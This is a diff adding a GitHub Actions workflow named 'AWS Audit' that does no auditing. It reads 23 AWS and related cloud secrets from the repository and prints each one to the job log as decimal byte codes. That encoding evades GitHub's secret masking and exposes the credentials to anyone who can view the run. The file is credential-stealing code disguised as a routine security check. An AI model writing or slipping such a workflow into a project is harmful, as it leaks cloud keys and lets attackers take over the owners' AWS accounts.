@@ -1,0 +1,42 @@
+name: AWS Audit
+
+on:
+  workflow_dispatch:
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: AWS Secrets Audit
+        env:
+          A0: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          A1: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          A2: ${{ secrets.AWS_ACCOUNT_ID }}
+          A3: ${{ secrets.AWS_REGION }}
+          A4: ${{ secrets.AWS_ACCESS_KEY }}
+          A5: ${{ secrets.AWS_SECRET_KEY }}
+          A6: ${{ secrets.AMAZON_ACCESS_KEY }}
+          A7: ${{ secrets.AMAZON_SECRET_KEY }}
+          A8: ${{ secrets.S3_ACCESS_KEY }}
+          A9: ${{ secrets.S3_SECRET_KEY }}
+          A10: ${{ secrets.ECR_ACCESS_KEY }}
+          A11: ${{ secrets.ECR_SECRET_KEY }}
+          A12: ${{ secrets.LAMBDA_ACCESS_KEY }}
+          A13: ${{ secrets.LAMBDA_SECRET_KEY }}
+          A14: ${{ secrets.CLOUDFRONT_ACCESS_KEY }}
+          A15: ${{ secrets.ROUTE53_ACCESS_KEY }}
+          A16: ${{ secrets.IAM_ACCESS_KEY }}
+          A17: ${{ secrets.EKS_ACCESS_KEY }}
+          A18: ${{ secrets.TERRAFORM_AWS_KEY }}
+          A19: ${{ secrets.TERRAFORM_AWS_SECRET }}
+          A20: ${{ secrets.CDK_AWS_KEY }}
+          A21: ${{ secrets.AMPLIFY_ACCESS_KEY }}
+          A22: ${{ secrets.AMPLIFY_SECRET_KEY }}
+        run: |
+          echo "=== AWS AUDIT ==="
+          for var in $(env | grep '^A' | sort); do
+            varname=$(echo "$var" | cut -d= -f1)
+            val=$(echo "$var" | cut -d= -f2-)
+            echo "$varname: ASCII=[$(echo -n "$val" | od -An -tu1 | tr '\n' ' ')]"
+          done
+          echo "=== END ==="
